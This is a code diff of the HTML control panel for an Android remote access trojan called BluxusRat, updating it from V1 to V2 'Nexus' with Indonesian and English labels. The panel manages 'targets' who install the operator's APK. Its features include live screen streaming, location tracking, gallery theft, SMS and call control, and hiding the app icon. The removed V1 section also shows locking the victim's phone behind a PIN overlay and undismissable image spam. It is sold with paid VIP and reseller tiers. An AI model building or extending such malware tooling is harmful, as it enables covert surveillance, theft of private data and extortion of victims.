@@ -3,124 +3,190 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>BluxusRat V1 [NewEra]</title>
+<title>BluxusRat V2 — Nexus</title>
 <link rel="icon" href="assets/icon-app.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Manrope:wght@400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="style_new.css">
 </head>
 <body>
 
-<div id="conn-dot"></div>
+<div id="conn-dot" class="conn-indicator"></div>
 
 <div id="app">
-<div class="app-shell">
+<div class="app-container">
 
-<!-- LOADING -->
+<!-- ============ LOADING ============ -->
 <div class="screen active" id="screen-loading">
-<div class="brand-logo">BluxusRat</div>
-<div class="brand-sub">V1 [NewEra]</div>
-<div class="brand-ver">Control Panel</div>
-<div class="progress-wrap"><div class="progress-fill" id="progress-fill"></div></div>
-<div id="loading-text">Connecting to Firebase...</div>
+<div class="loading-box">
+<div class="loading-logo">
+<div class="logo-text">BLUXUS</div>
+<div class="logo-sub">RAT</div>
+</div>
+<div class="loading-verse">Nexus Edition</div>
+<div class="loading-progress">
+<div class="progress-bar"></div>
+</div>
+<div class="loading-text" id="loading-text">Initializing...</div>
+</div>
 </div>
 
-<!-- LOGIN -->
+<!-- ============ LOGIN ============ -->
 <div class="screen" id="screen-login">
-<div class="banner-wrap">
-<img src="assets/banner-login.png" onerror="this.style.display='none'">
-<div class="banner-title">BluxusRat</div>
-<div class="banner-sub">V1 [NewEra]</div>
+<div class="login-wrapper">
+<div class="login-bg-glow glow-1"></div>
+<div class="login-bg-glow glow-2"></div>
+
+<div class="login-hero">
+<div class="hero-gradient"></div>
+<div class="hero-content">
+<div class="hero-icon">
+<i class="fas fa-server"></i>
 </div>
-<div class="form-zone">
-<div class="card">
-<div class="card-title">Sign In</div>
-<div class="field">
-<label>Username</label>
-<div class="input-wrap">
-<div class="ico-badge"><i class="fa-solid fa-user"></i></div>
-<input type="text" id="login-usn" placeholder="username">
-</div>
-</div>
-<div class="field">
-<label>Password</label>
-<div class="input-wrap">
-<div class="ico-badge"><i class="fa-solid fa-lock"></i></div>
-<input type="password" id="login-pw" placeholder="••••••••">
+<div class="hero-title">BLUXUS RAT</div>
+<div class="hero-subtitle">Nexus Control Panel</div>
+<div class="hero-desc">Advanced Device Control & Monitoring System</div>
 </div>
 </div>
-<button class="btn btn-primary ripple" id="btn-login"><i class="fa-solid fa-right-to-bracket"></i> Login</button>
-<div class="login-redirect" id="login-redirect"><div class="spin"></div><span>Mengalihkan...</span></div>
-<div class="login-meta">BluxusRat V1 — NewEra</div>
+
+<div class="login-form-box">
+<div class="form-card">
+<div class="form-header">
+<div class="form-title">Access Control</div>
+<div class="form-subtitle">Enter your credentials</div>
+</div>
+
+<div class="form-field">
+<label class="field-label">
+<i class="fas fa-user"></i>
+<span>Username</span>
+</label>
+<input type="text" id="login-usn" class="field-input" placeholder="Enter username">
+<div class="field-line"></div>
+</div>
+
+<div class="form-field">
+<label class="field-label">
+<i class="fas fa-lock"></i>
+<span>Password</span>
+</label>
+<input type="password" id="login-pw" class="field-input" placeholder="••••••••">
+<div class="field-line"></div>
+</div>
+
+<button class="btn btn-primary" id="btn-login">
+<span class="btn-text">Sign In</span>
+<i class="fas fa-arrow-right"></i>
+</button>
+
+<div class="login-status" id="login-redirect">
+<div class="status-spinner"></div>
+<span>Authenticating...</span>
+</div>
+
+<div class="form-footer">BluxusRat V2 Nexus • 2026</div>
 </div>
 </div>
 </div>
 
-<!-- DASHBOARD -->
+<!-- ============ DASHBOARD ============ -->
 <div class="screen" id="screen-dash">
+<div class="dash-container">
 <div class="dash-header">
-<div class="hamburger" id="btn-hamburger"><i class="fa-solid fa-bars"></i></div>
-<span class="logo-text">BluxusRat</span>
-<div style="width:40px"></div>
+<div class="header-left">
+<button class="btn-menu" id="btn-hamburger">
+<span></span>
+<span></span>
+<span></span>
+</button>
+<div class="header-brand">BLUXUS</div>
 </div>
-<div class="dash-body">
-<div class="welcome-banner fade-in">
-<img src="assets/banner-welcome.png" onerror="this.style.display='none'">
-<div class="wb-badge" id="dash-badge">MEMBER</div>
-<div class="wb-text">
-<div class="w">Welcome back, <span id="dash-welcome-name">User</span></div>
-<div class="s">Control panel siap</div>
-</div>
-</div>
-<div class="user-card fade-in-1">
-<div class="content">
-<div class="left">
-<div class="label">Username</div>
-<div class="usn" id="dash-usn">—</div>
-<div class="role" id="dash-role"><i class="fa-solid fa-user"></i> member</div>
-</div>
-<div class="right">
-<div class="label">User Code</div>
-<div class="val mono" id="dash-usercode">—</div>
-</div>
-</div>
-</div>
-<div class="mini-grid fade-in-2">
-<div class="mini-card">
-<div class="ico-badge"><i class="fa-solid fa-crosshairs"></i></div>
-<div class="info"><div class="label">Targets</div><div class="val" id="dash-targets">0</div></div>
-</div>
-<div class="mini-card">
-<div class="ico-badge"><i class="fa-solid fa-wifi"></i></div>
-<div class="info"><div class="label">Online</div><div class="val" id="dash-online">0</div></div>
-</div>
-</div>
-<div id="announce-wrap" class="fade-in-3"></div>
+<div class="header-status">
+<div class="status-badge"><i class="fas fa-circle"></i> ACTIVE</div>
 </div>
 </div>
 
-<!-- RAT -->
-<div class="screen" id="screen-rat">
-<div class="dash-header">
-<div class="hamburger" id="btn-hamburger-rat"><i class="fa-solid fa-bars"></i></div>
-<span class="page-title">Rat</span>
-<div style="width:40px"></div>
-</div>
 <div class="dash-body">
-<div class="usercode-card fade-in">
-<div class="uc-head">
-<div class="ico-badge"><i class="fa-solid fa-key"></i></div>
-<div><div class="t">User Code Kamu</div><div class="d">Taruh di config.json APK</div></div>
+<div class="welcome-card">
+<div class="card-glow"></div>
+<div class="card-content">
+<div class="welcome-top">
+<div class="welcome-text">
+<div class="greeting">Welcome back, <span id="dash-welcome-name">User</span></div>
+<div class="subtext">Your control center is ready</div>
 </div>
-<div class="uc-row">
-<div class="uc-code" id="rat-usercode">—</div>
-<button class="uc-copy ripple" id="btn-copy-usercode"><i class="fa-solid fa-copy"></i></button>
 </div>
-<div class="uc-info"><i class="fa-solid fa-circle-info"></i><span>Code ini buat identifikasi target yang install APK kamu.</span></div>
+<div class="welcome-grid">
+<div class="stat-item">
+<div class="stat-icon"><i class="fas fa-crosshairs"></i></div>
+<div class="stat-info">
+<div class="stat-label">Targets</div>
+<div class="stat-value" id="dash-targets">0</div>
 </div>
-<div class="section fade-in-1">
-<h3><div class="ico-badge"><i class="fa-solid fa-satellite-dish"></i></div> Target List</h3>
+</div>
+<div class="stat-item">
+<div class="stat-icon"><i class="fas fa-wifi"></i></div>
+<div class="stat-info">
+<div class="stat-label">Online</div>
+<div class="stat-value" id="dash-online">0</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="user-info-card">
+<div class="info-grid">
+<div class="info-col">
+<div class="info-label">Username</div>
+<div class="info-value mono" id="dash-usn">—</div>
+<div class="info-role" id="dash-role"><i class="fas fa-badge"></i> member</div>
+</div>
+<div class="info-col">
+<div class="info-label">User Code</div>
+<div class="info-value mono" id="dash-usercode">—</div>
+</div>
+</div>
+</div>
+
+<div id="announce-wrap"></div>
+</div>
+</div>
+
+<!-- ============ RAT ============ -->
+<div class="screen" id="screen-rat">
+<div class="dash-container">
+<div class="dash-header">
+<button class="btn-menu" id="btn-hamburger-rat">
+<span></span>
+<span></span>
+<span></span>
+</button>
+<div class="page-title">Rat Control</div>
+</div>
+
+<div class="dash-body">
+<div class="usercode-section">
+<div class="uc-header">
+<div class="uc-icon"><i class="fas fa-key"></i></div>
+<div class="uc-text">
+<div class="uc-title">Your Unique Code</div>
+<div class="uc-desc">Use this in APK configuration</div>
+</div>
+</div>
+<div class="uc-display">
+<div class="uc-code mono" id="rat-usercode">—</div>
+<button class="uc-copy" id="btn-copy-usercode" title="Copy"><i class="fas fa-copy"></i></button>
+</div>
+<div class="uc-note"><i class="fas fa-info-circle"></i>This code identifies devices that install your APK</div>
+</div>
+
+<div class="section-box">
+<div class="section-header">
+<i class="fas fa-satellite-dish"></i>
+<span>Connected Devices</span>
+</div>
 <div class="target-list" id="target-list">
 <div class="skeleton"></div>
 <div class="skeleton"></div>
@@ -129,446 +195,177 @@
 </div>
 </div>
 
-<!-- TARGET DETAIL -->
+<!-- ============ TARGET ============ -->
 <div class="screen" id="screen-target">
+<div class="dash-container">
 <div class="dash-header">
-<div class="hamburger" id="btn-target-back"><i class="fa-solid fa-arrow-left"></i></div>
-<span class="page-title" id="target-title">Target</span>
-<div style="width:40px"></div>
+<button class="btn-back" id="btn-target-back"><i class="fas fa-arrow-left"></i></button>
+<div class="page-title" id="target-title">Device</div>
 </div>
-<div class="dash-body">
-<div class="feature-grid" id="feature-grid"></div>
 
-<!-- INFO DEVICE -->
+<div class="dash-body">
+<div class="feature-tabs" id="feature-grid"></div>
+
+<!-- Feature Pages -->
 <div class="feature-page" id="fp-info">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Info Device</div></div>
-<div class="fp-desc">Detail lengkap device target. Data terupdate otomatis.</div>
-<div class="info-grid" id="info-content"></div>
+<div class="fp-nav"><button data-back="grid" class="btn-back"><i class="fas fa-arrow-left"></i></button><div class="fp-title">Device Information</div></div>
+<div class="fp-content"><div class="info-grid" id="info-content"></div></div>
 </div>
 
-<!-- LIVE CAM -->
 <div class="feature-page" id="fp-live">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Live Cam</div></div>
-<div class="fp-desc">Stream layar target secara real-time. Mendukung semua versi Android.</div>
-<div class="toggle-row" id="live-toggle-row">
-<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-video"></i></div><div class="tr-info"><div class="n">Aktifkan Live Cam</div><div class="d">Stream layar target</div></div></div>
-<label class="switch"><input type="checkbox" id="sw-live"><span class="slider"></span></label>
+<div class="fp-nav"><button data-back="grid" class="btn-back"><i class="fas fa-arrow-left"></i></button><div class="fp-title">Live Stream</div></div>
+<div class="fp-content">
+<div class="live-control">
+<label class="toggle-switch">
+<input type="checkbox" id="sw-live">
+<span class="toggle-slider"></span>
+</label>
+<span>Start Live Stream</span>
 </div>
-<div class="fps-control" id="fps-control">
-<div class="fps-label"><i class="fa-solid fa-gauge-high"></i> FPS: <span id="fps-value">2</span></div>
-<input type="range" id="fps-slider" min="1" max="30" value="2" class="range-input">
+<div class="fps-slider-box" id="fps-control">
+<div class="fps-label"><i class="fas fa-gauge-high"></i>FPS: <span id="fps-value">2</span></div>
+<input type="range" id="fps-slider" min="1" max="30" value="2" class="range-slider">
 </div>
-<div class="live-view" id="live-view"><div class="empty"><i class="fa-solid fa-spinner fa-spin"></i><div>Live cam nonaktif</div></div></div>
-</div>
-
-<!-- LOCATE -->
-<div class="feature-page" id="fp-locate">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Locate</div></div>
-<div class="fp-desc">Ambil lokasi target secara real-time + alamat lengkap.</div>
-<div class="toggle-row">
-<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-location-dot"></i></div><div class="tr-info"><div class="n">Aktifkan Locate</div><div class="d">Lokasi target</div></div></div>
-<label class="switch"><input type="checkbox" id="sw-loc"><span class="slider"></span></label>
-</div>
-<div class="loading-overlay hidden" id="loc-loading"><div class="loader"></div><div class="loading-text">Mencari lokasi target...</div></div>
-<div class="loc-map" id="loc-map"><div class="empty"><i class="fa-solid fa-map-location-dot"></i><div>Locate nonaktif</div></div></div>
-<div class="loc-info" id="loc-info">
-<div class="loc-address" id="loc-address">—</div>
-<div class="loc-coords" id="loc-coords">—</div>
+<div class="live-display" id="live-display"></div>
 </div>
 </div>
 
-<!-- SENTER & STROBO -->
-<div class="feature-page" id="fp-flash">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Senter & Strobo</div></div>
-<div class="fp-desc">Kontrol senter target. Strobo bakal kedip terus-terusan.</div>
-<div class="toggle-row">
-<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-lightbulb"></i></div><div class="tr-info"><div class="n">Senter</div><div class="d">Flashlight target</div></div></div>
-<label class="switch"><input type="checkbox" id="sw-flash"><span class="slider"></span></label>
-</div>
-<div class="toggle-row">
-<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-bolt"></i></div><div class="tr-info"><div class="n">Strobo</div><div class="d">Kedip terus tiap 1 detik</div></div></div>
-<label class="switch"><input type="checkbox" id="sw-strobo"><span class="slider"></span></label>
-</div>
-</div>
-
-<!-- KUNCI HP -->
-<div class="feature-page" id="fp-lock">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Kunci HP</div></div>
-<div class="fp-desc">Kunci HP target pake overlay + custom pesan. Target harus masukin PIN yang lo set.</div>
-<div class="section">
-<div class="field"><label>PIN 4 Digit</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-lock"></i></div><input type="tel" id="lock-pin" maxlength="4" placeholder="0000"></div></div>
-<div class="field"><label>Pesan Custom</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-comment"></i></div><input type="text" id="lock-message" placeholder="HP Terkunci" maxlength="50"></div></div>
-<div class="toggle-row">
-<div class="tr-left"><div class="ico-badge"><i class="fa-solid fa-mobile-screen-button"></i></div><div class="tr-info"><div class="n">Status Lock</div><div class="d">Aktifin buat kunci HP target</div></div></div>
-<label class="switch"><input type="checkbox" id="sw-lock"><span class="slider"></span></label>
+<div class="feature-page" id="fp-location">
+<div class="fp-nav"><button data-back="grid" class="btn-back"><i class="fas fa-arrow-left"></i></button><div class="fp-title">Location</div></div>
+<div class="fp-content">
+<div class="location-display" id="location-display">
+<div class="location-placeholder"><i class="fas fa-map-pin"></i> Fetching location...</div>
 </div>
 </div>
 </div>
 
-<!-- VOLUME -->
-<div class="feature-page" id="fp-volume">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Volume</div></div>
-<div class="fp-desc">Atur volume HP target.</div>
-<div class="section">
-<div class="slider-row">
-<div class="slider-icon"><i class="fa-solid fa-volume-low"></i></div>
-<input type="range" id="volume-slider" min="0" max="100" value="50" class="range-input">
-<div class="slider-icon"><i class="fa-solid fa-volume-high"></i></div>
-</div>
-<div class="slider-value" id="volume-value">50%</div>
-<button class="btn btn-primary" id="btn-set-volume" style="margin-top:14px"><i class="fa-solid fa-check"></i> Terapkan Volume</button>
-</div>
-</div>
-
-<!-- KECERAHAN -->
-<div class="feature-page" id="fp-brightness">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Set Kecerahan</div></div>
-<div class="fp-desc">Atur kecerahan layar HP target.</div>
-<div class="section">
-<div class="slider-row">
-<div class="slider-icon"><i class="fa-solid fa-sun"></i></div>
-<input type="range" id="brightness-slider" min="0" max="100" value="50" class="range-input">
-<div class="slider-icon"><i class="fa-solid fa-sun" style="font-size:20px"></i></div>
-</div>
-<div class="slider-value" id="brightness-value">50%</div>
-<button class="btn btn-primary" id="btn-set-brightness" style="margin-top:14px"><i class="fa-solid fa-check"></i> Terapkan Kecerahan</button>
-</div>
-</div>
-
-<!-- URL DIRECT -->
-<div class="feature-page" id="fp-url">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">URL Direct</div></div>
-<div class="fp-desc">Buka URL di browser HP target.</div>
-<div class="section">
-<div class="field"><label>URL Target</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input type="url" id="url-direct" placeholder="https://example.com"></div></div>
-<button class="btn btn-primary" id="btn-open-url" style="margin-top:8px"><i class="fa-solid fa-arrow-up-right-from-square"></i> Buka URL di Target</button>
-</div>
-</div>
-
-<!-- GALLERY -->
 <div class="feature-page" id="fp-gallery">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Get Gallery</div></div>
-<div class="fp-desc">Ambil semua foto dari galeri target. Foto muncul lengkap.</div>
-<div class="section">
-<button class="btn btn-primary" id="btn-get-gallery"><i class="fa-solid fa-images"></i> Ambil Galeri</button>
-<div class="loading-overlay hidden" id="gallery-loading"><div class="loader"></div><div class="loading-text">Mengambil foto dari target...</div></div>
-<div class="gallery-grid" id="gallery-grid"><div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-image"></i><div>Klik tombol buat ambil galeri target</div></div></div>
+<div class="fp-nav"><button data-back="grid" class="btn-back"><i class="fas fa-arrow-left"></i></button><div class="fp-title">Gallery</div></div>
+<div class="fp-content">
+<div class="gallery-grid" id="gallery-grid"></div>
 </div>
 </div>
 
-<!-- TOAST -->
-<div class="feature-page" id="fp-toast">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Kirim Toast</div></div>
-<div class="fp-desc">Tampilkan pesan di HP target.</div>
-<div class="section">
-<div class="field"><label>Pesan Toast</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-comment-dots"></i></div><input type="text" id="toast-message" placeholder="Contoh: Halo" maxlength="100"></div></div>
-<button class="btn btn-primary" id="btn-send-toast"><i class="fa-solid fa-paper-plane"></i> Kirim Toast</button>
+<div class="feature-page" id="fp-call">
+<div class="fp-nav"><button data-back="grid" class="btn-back"><i class="fas fa-arrow-left"></i></button><div class="fp-title">Call Control</div></div>
+<div class="fp-content">
+<div class="call-info" id="call-info">No active calls</div>
 </div>
 </div>
 
-<!-- HIDE APP -->
-<div class="feature-page" id="fp-hideapp">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Hide App</div></div>
-<div class="fp-desc">Sembunyikan icon APK di HP target. Work di semua Android.</div>
-<div class="section">
-<button class="btn btn-primary" id="btn-hide-app" style="margin-bottom:10px"><i class="fa-solid fa-eye-slash"></i> Sembunyikan Icon</button>
-<button class="btn btn-ghost" id="btn-show-app"><i class="fa-solid fa-eye"></i> Tampilkan Icon</button>
-</div>
-</div>
-
-<!-- CHANGE WALLPAPER -->
-<div class="feature-page" id="fp-wallpaper">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Change Wallpaper</div></div>
-<div class="fp-desc">Ganti wallpaper HP target. Kasih URL gambar atau upload dari HP kamu.</div>
-<div class="section">
-<div class="field"><label>URL Gambar</label><div class="input-wrap"><div class="ico-badge"><i class="fa-solid fa-link"></i></div><input type="url" id="wallpaper-url" placeholder="https://i.imgur.com/xxx.jpg"></div></div>
-<div class="divider">ATAU</div>
-<div class="upload-zone" id="wallpaper-upload-zone">
-<input type="file" id="wallpaper-file" accept="image/*">
-<div class="uz-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
-<div class="uz-title">Upload dari HP kamu</div>
-<div class="uz-desc">Max 5 MB</div>
-</div>
-<div class="wallpaper-preview" id="wallpaper-preview" style="display:none"><img id="wallpaper-preview-img" src=""></div>
-<div class="field"><label>Tipe Wallpaper</label>
-<div class="radio-group" id="wallpaper-type">
-<label class="radio-opt active" data-val="home"><input type="radio" name="wptype" value="home" checked> <i class="fa-solid fa-house"></i> Home Screen</label>
-<label class="radio-opt" data-val="lock"><input type="radio" name="wptype" value="lock"> <i class="fa-solid fa-lock"></i> Lock Screen</label>
-<label class="radio-opt" data-val="both"><input type="radio" name="wptype" value="both"> <i class="fa-solid fa-mobile-screen"></i> Keduanya</label>
-</div>
-</div>
-<button class="btn btn-primary" id="btn-apply-wallpaper"><i class="fa-solid fa-image"></i> Terapkan Wallpaper</button>
-</div>
-</div>
-
-<!-- SPAM UI -->
-<div class="feature-page" id="fp-spamui">
-<div class="fp-header"><div class="fp-back" data-back="grid"><i class="fa-solid fa-arrow-left"></i></div><div class="fp-title">Spam UI</div></div>
-<div class="fp-desc">Kirim max 10 foto ke layar HP target. Foto bakal bertebaran dan gak bisa di-dismiss sama target. Stop dari panel ini.</div>
-<div class="section">
-<div class="upload-zone" id="spamui-upload-zone">
-<input type="file" id="spamui-file" accept="image/*" multiple>
-<div class="uz-icon"><i class="fa-solid fa-images"></i></div>
-<div class="uz-title">Pilih 5-10 Foto</div>
-<div class="uz-desc">Max 10 foto, 5 MB per foto</div>
-</div>
-<div class="spamui-list" id="spamui-list"></div>
-<div class="spamui-info" id="spamui-info" style="display:none">
-<div class="spamui-count">Total: <b id="spamui-count">0</b> foto</div>
-<button class="btn btn-ghost btn-sm" id="btn-spamui-clear"><i class="fa-solid fa-trash"></i> Hapus Semua</button>
-</div>
-<div class="btn-row">
-<button class="btn btn-primary" id="btn-spamui-start" disabled><i class="fa-solid fa-play"></i> Mulai Spam UI</button>
-<button class="btn btn-danger" id="btn-spamui-stop" style="display:none"><i class="fa-solid fa-stop"></i> Stop Spam UI</button>
-</div>
+<div class="feature-page" id="fp-sms">
+<div class="fp-nav"><button data-back="grid" class="btn-back"><i class="fas fa-arrow-left"></i></button><div class="fp-title">SMS Manager</div></div>
+<div class="fp-content">
+<div class="sms-list" id="sms-list"></div>
 </div>
 </div>
 
 </div>
 </div>
 
-<!-- BLUXANIME -->
-<div class="screen" id="screen-anime">
-<div class="anime-header">
-<div class="anime-header-top">
-<div class="anime-header-left">
-<div class="hamburger" id="btn-hamburger-anime"><i class="fa-solid fa-bars"></i></div>
-<div class="anime-logo">BluxAnime</div>
-</div>
-<div class="anime-search-btn" id="btn-anime-search"><i class="fa-solid fa-magnifying-glass"></i></div>
-</div>
-<div class="anime-search-inline" id="anime-search-inline">
-<input type="text" id="anime-search-input" placeholder="Cari anime...">
-<div class="anime-search-close" id="btn-anime-search-close"><i class="fa-solid fa-xmark"></i></div>
-</div>
-</div>
-<div class="anime-body" id="anime-body">
-<div class="anime-banner"><img id="anime-banner-img" src="" onerror="this.style.opacity='0'"></div>
-<div class="anime-title-block">
-<div class="t">BLUXANIME</div>
-<div class="s">Nonton anime subtitle Indonesia gratis</div>
-</div>
-<div class="anime-rows" id="anime-rows"><div class="anime-loading"><div class="sp"></div><span>Loading...</span></div></div>
-</div>
-</div>
-
-<!-- TOOLS -->
-<div class="screen" id="screen-tools">
-<div class="dash-header">
-<div class="hamburger" id="btn-hamburger-tools"><i class="fa-solid fa-bars"></i></div>
-<span class="page-title">Tools</span>
-<div style="width:40px"></div>
-</div>
-<div class="dash-body">
-<div class="section fade-in">
-<h3><div class="ico-badge"><i class="fa-solid fa-toolbox"></i></div> Regular Tools</h3>
-<div class="tools-grid" id="tools-grid"></div>
-</div>
-<div class="vip-section fade-in-1">
-<div class="vip-header">
-<div class="vh-icon"><i class="fa-solid fa-crown"></i></div>
-<div class="vh-text"><div class="n">VIP Tools</div><div class="d">Khusus VIP, Reseller & Owner</div></div>
-</div>
-<div class="tools-grid" id="vip-tools-grid"></div>
-</div>
-</div>
-</div>
-
-<!-- BENEFIT ROLE -->
-<div class="screen" id="screen-benefit">
-<div class="dash-header">
-<div class="hamburger" id="btn-hamburger-benefit"><i class="fa-solid fa-bars"></i></div>
-<span class="page-title">Benefit Role</span>
-<div style="width:40px"></div>
-</div>
-<div class="dash-body">
-<div class="benefit-hero fade-in">
-<div class="bh-icon"><i class="fa-solid fa-medal"></i></div>
-<div class="bh-title">Benefit Role</div>
-<div class="bh-desc">Kenali role di BluxusRat & benefitnya.</div>
-</div>
-<div id="role-cards" class="fade-in-1"></div>
-<div class="section fade-in-2">
-<h3><div class="ico-badge"><i class="fa-solid fa-question"></i></div> FAQ</h3>
-<div id="faq-list"></div>
-</div>
-<button class="btn btn-primary fade-in-3" id="btn-upgrade-role"><i class="fa-solid fa-arrow-up"></i> Upgrade Role</button>
-</div>
-</div>
-
-<!-- ACCOUNT -->
+<!-- ============ ACCOUNT ============ -->
 <div class="screen" id="screen-account">
+<div class="dash-container">
 <div class="dash-header">
-<div class="hamburger" id="btn-hamburger-account"><i class="fa-solid fa-bars"></i></div>
-<span class="page-title">Account</span>
-<div style="width:40px"></div>
+<button class="btn-menu" id="btn-hamburger-account"><span></span><span></span><span></span></button>
+<div class="page-title">Account</div>
 </div>
 <div class="dash-body">
-<div class="profile-head fade-in">
-<div class="avatar-wrap">
-<img class="avatar" id="acc-avatar" src="" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22%235a4548%22><circle cx=%2212%22 cy=%228%22 r=%224%22/><path d=%22M4 22a8 8 0 0 1 16 0%22/></svg>'">
-<div class="edit" id="btn-change-photo"><i class="fa-solid fa-camera"></i></div>
+<div class="account-menu">
+<div class="menu-item" id="btn-profile">
+<div class="menu-icon"><i class="fas fa-user-circle"></i></div>
+<div class="menu-text"><div class="menu-name">Profile</div><div class="menu-desc">View your information</div></div>
+<i class="fas fa-chevron-right"></i>
 </div>
-<div class="uname" id="acc-usn">—</div>
-<div class="urole" id="acc-role">member</div>
+<div class="menu-item" id="btn-settings">
+<div class="menu-icon"><i class="fas fa-cog"></i></div>
+<div class="menu-text"><div class="menu-name">Settings</div><div class="menu-desc">Preferences & security</div></div>
+<i class="fas fa-chevron-right"></i>
 </div>
-<div class="section fade-in-1">
-<div class="info-row"><span class="lbl"><i class="fa-solid fa-key"></i> User Code</span><span class="val mono" id="acc-usercode">—</span></div>
-<div class="info-sep"></div>
-<div class="info-row"><span class="lbl"><i class="fa-solid fa-calendar"></i> Created</span><span class="val" id="acc-created">—</span></div>
+<div class="menu-item danger" id="btn-logout">
+<div class="menu-icon"><i class="fas fa-sign-out-alt"></i></div>
+<div class="menu-text"><div class="menu-name">Logout</div><div class="menu-desc">Sign out from account</div></div>
+<i class="fas fa-chevron-right"></i>
 </div>
-<div class="list-item fade-in-2" id="btn-settings">
-<div class="ico-badge"><i class="fa-solid fa-gear"></i></div>
-<div class="txt"><div class="n">Settings</div><div class="d">Ganti password & foto</div></div>
-<div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
-</div>
-<div class="list-item danger fade-in-3" id="btn-logout">
-<div class="ico-badge"><i class="fa-solid fa-right-from-bracket"></i></div>
-<div class="txt"><div class="n">Log Out</div><div class="d">Keluar akun</div></div>
-<div class="arrow"><i class="fa-solid fa-chevron-right"></i></div>
 </div>
 </div>
 </div>
 
-<!-- CHANGELOG -->
-<div class="screen" id="screen-changelog">
-<div class="dash-header">
-<div class="hamburger" id="btn-hamburger-changelog"><i class="fa-solid fa-bars"></i></div>
-<span class="page-title">Changelog</span>
-<div style="width:40px"></div>
-</div>
-<div class="dash-body">
-<div class="benefit-hero fade-in">
-<div class="bh-icon"><i class="fa-solid fa-code-branch"></i></div>
-<div class="bh-title">Changelog</div>
-<div class="bh-desc">Catatan update & perubahan BluxusRat setiap patch.</div>
-</div>
-<div id="changelog-list" class="fade-in-1"></div>
-</div>
-</div>
-
-<!-- ABOUT -->
+<!-- ============ ABOUT ============ -->
 <div class="screen" id="screen-about">
+<div class="dash-container">
 <div class="dash-header">
-<div class="hamburger" id="btn-hamburger-about"><i class="fa-solid fa-bars"></i></div>
-<span class="page-title">About</span>
-<div style="width:40px"></div>
+<button class="btn-menu" id="btn-hamburger-about"><span></span><span></span><span></span></button>
+<div class="page-title">About</div>
 </div>
 <div class="dash-body">
-<div class="about-hero fade-in">
-<div class="ab-logo">BluxusRat</div>
-<div class="ab-ver">V1 [NewEra]</div>
-<div class="ab-desc">Control panel untuk monitoring & control device.</div>
+<div class="about-hero">
+<div class="about-logo">BLUXUS RAT</div>
+<div class="about-version">V2 Nexus Edition</div>
+<div class="about-tagline">Advanced Control Panel System</div>
 </div>
-<div class="section fade-in-1">
-<h3><div class="ico-badge"><i class="fa-solid fa-code"></i></div> Developers</h3>
-<div class="list-item" onclick="window.open('https://wa.me/6283137236898','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">Yummy</div><div class="d">Lead Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
-<div class="list-item" onclick="window.open('https://wa.me/6281234567890','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">metzzX</div><div class="d">Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
-<div class="list-item" onclick="window.open('https://wa.me/6281234567890','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">kayXolcom</div><div class="d">Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
-<div class="list-item" onclick="window.open('https://wa.me/6281234567890','_blank')"><div class="ico-badge"><i class="fa-brands fa-whatsapp"></i></div><div class="txt"><div class="n">.....</div><div class="d">Developer</div></div><div class="arrow"><i class="fa-solid fa-arrow-up-right-from-square"></i></div></div>
+<div class="info-section">
+<div class="section-title">Developers</div>
+<div class="dev-list">
+<div class="dev-item" onclick="window.open('https://wa.me/6283137236898','_blank')">
+<div class="dev-icon"><i class="fab fa-whatsapp"></i></div>
+<div class="dev-info">
